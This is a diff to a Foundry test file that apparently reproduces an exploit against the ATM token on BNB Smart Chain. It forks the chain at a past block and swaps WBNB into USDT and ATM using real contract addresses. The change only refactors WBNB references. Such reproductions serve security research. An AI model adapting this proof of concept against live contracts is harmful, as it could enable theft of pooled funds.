@@ -8,11 +8,12 @@ import "@interface/IPancakeV2.sol";
 import "@interface/IWBNB.sol";
 import "@interface/IERC20.sol";
 
+IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+
 contract AtmTest is Test {
     // USDT/BNB
     IPancakePairV3 USDT_BNB_V3_Pool =
         IPancakePairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
-    WBNB BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);
 
@@ -27,7 +28,7 @@ contract AtmTest is Test {
 
     function setUp() public {
         vm.createSelectFork("bsc", 37483301 - 1);
-        deal(address(BNB), address(this), BorrowBNB);
+        deal(address(WBNB), address(this), BorrowBNB);
     }
 
     function print(string memory _txt, uint256 value, uint256 decimal) public {
@@ -36,11 +37,11 @@ contract AtmTest is Test {
 
     function testExploit() public {
         ATM.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
-        BNB.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
+        WBNB.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
         USDT.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
 
-        token2token(address(BNB), address(USDT), 18_853 ether);
-        token2token(address(BNB), address(ATM), 70 ether);
+        token2token(address(WBNB), address(USDT), 18_853 ether);
+        token2token(address(WBNB), address(ATM), 70 ether);
 
         // uint256 pair_wbnb = BNB.balanceOf(address(ATM_BNB_Pool));
         print("USDT balance", USDT.balanceOf(address(this)), 18);
